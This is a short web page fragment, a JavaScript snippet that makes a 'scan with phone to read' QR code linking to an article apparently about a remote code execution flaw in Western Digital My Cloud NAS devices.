)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/Western-Digital-My-Cloud-NAS-chk\_vv\_sharename-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 